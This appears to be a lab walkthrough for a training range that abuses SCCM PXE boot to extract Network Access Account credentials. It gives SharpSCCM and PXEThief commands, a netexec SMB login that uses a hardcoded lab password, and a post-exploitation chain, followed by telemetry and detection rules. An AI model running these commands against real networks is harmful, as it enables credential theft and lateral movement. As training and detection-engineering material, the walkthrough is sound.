# WT#035 — SCCM PXE Boot Abuse

## Metadata
| Field | Value |
|-------|-------|
| **Target VM** | mbr02 (192.168.77.23) |
| **Domain** | range.local |
| **Starting Credential** | Code execution on mbr02 (low-priv) |
| **Tools Required** | PXEThief, SharpSCCM, TFTP client |
| **Certifications** | WKL (WasteHelloKitty — OADOC) |
| **MITRE ATT&CK** | T1078.001 (Default Accounts), T1053.002 (Scheduled Task) |
| **Difficulty** | Medium |

## Prerequisites
- Code execution on mbr02
- SCCM PXE boot service point configured on mbr02 — verifiable via `10-sccm-verify.yml`
- Network access to SCCM PXE server (TFTP on port 69, HTTP on port 80/443)
- NAA credentials extracted via WT#034

## Attack Steps

### 1. Locate SCCM PXE service point

```powershell
# Discover SCCM infrastructure via WMI
SharpSCCM.exe get site -s sccm-range.range.local
```

### 2. Extract PXE boot image

```powershell
# Query PXE boot parameters
SharpSCCM.exe get pxe -s sccm-range.range.local
```

### 3. Download boot image variables

```powershell
# PXEThief retrieves boot image and task sequence variables
PXEThief.exe get-bootimage -p sccm-range.range.local
PXEThief.exe get-variables -p sccm-range.range.local
```

### 4. Extract NAA from task sequence

```powershell
# Task sequence variables contain plaintext credentials
SharpSCCM.exe get tasksequence -s sccm-range.range.local
```

### 5. Use NAA credentials for lateral movement

```bash
# Cross-reference with WT#034
netexec smb 192.168.77.23 -u 'range\sccm-naa' -p 'N@A_s3rv1c3!'
```

## Post-Exploitation Chain
```
SCCM PXE Boot Abuse (WT#035)
  └──> Task sequence variables → Credential extraction
       └──> NAA password from PXE boot policy
            └──> Range.local lateral movement
```

## Telemetry Verification
**On SCCM PXE server:**
- TFTP GET requests for boot image files
- HTTP GET requests for boot image downloads
- **SMSDPXE.log**: `C:\Program Files\Microsoft Configuration Manager\Logs\SMSDPXE.log`
- **Event ID 4663** (Access to PXE boot image files)

**On mbr02:**
- Process creation for PXEThief.exe or SharpSCCM.exe
- Outbound TFTP traffic (UDP port 69) to SCCM server

**Detection Rules:**
- SharpSCCM.exe `get pxe` or `get tasksequence` invocations
- TFTP downloads of boot image files from SCCM servers by non-SCCM processes
- PXE boot image variable extraction — monitor SMSDPXE.log for unusual queries

## Status
**CONFIGURED** — SCCM PXE boot service point configured on mbr02. Boot image available via TFTP. Verifiable via `10-sccm-verify.yml`. NAA credentials from WT#034 can decrypt task sequence variables.
